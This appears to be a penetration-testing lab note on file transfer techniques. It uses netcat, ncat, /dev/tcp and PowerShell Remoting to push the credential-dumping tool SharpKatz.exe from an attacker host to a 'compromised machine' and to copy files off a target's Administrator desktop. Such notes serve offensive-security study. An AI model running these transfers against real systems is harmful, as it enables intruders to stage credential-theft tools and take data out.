# Misc

### File Transfer with Netcat and Ncat

3. **Netcat - Attack Host - Sending File to Compromised machine**. The option `-q 0` gonna close connection after transferring.

```bash
# Using original netcat
victim$ nc -l -p 8000 > SharpKatz.exe
```

```bash
attacker$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```

4. **Ncat - Attack Host - Sending File to Compromised machine**

```bash
# Using Ncat
victim$ ncat -l -p 8000 --recv-only > SharpKatz.exe
```

```bash
attacker$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```

5. **Sending File as Input to Netcat**

```bash
attacker$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

```bash
victim$ nc 192.168.49.128 443 > SharpKatz.exe
```

6. **Sending File as Input to Ncat**

```bash
attacker$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

```bash
victim$ ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```

8. **Sending File from Attacker machine to Compromised using /dev/tcp**

```bash
# Netcat option
attacker$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

```bash
# Ncat option
attacker$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

```bash
# Connecting to netcat using /dev/tcp
victim$ 
cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```

### PowerShell Session File Transfer

I know I used to show about PowerShell file transfers in Windows File Transfer section, but there are possibilities when no HTTP, HTTPS or SMB are available. So here we'll use `PowerShell Remoting` aka WinRM. Usually work on TCP/5985 port for HTTP and TCP/5986 port for HTTPS.

1. **Check TCP 5985 Port on DATABASE01**

```powershell
PS C:\carnifex17> Test-NetConnection -ComputerName DATABASE01 -Port 5985
```

2. **Create a PowerShell Remoting Session to DATABASE01**

```powershell
PS C:\htb> $Session = New-PSSession -ComputerName DATABASE01
```

3. **Copy samplefile.txt from our Localhost to the DATABASE01 Session**

```powershell
PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```

4. **Copy DATABASE.txt from DATABASE01 Session to our Localhost**

```powershell
PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```
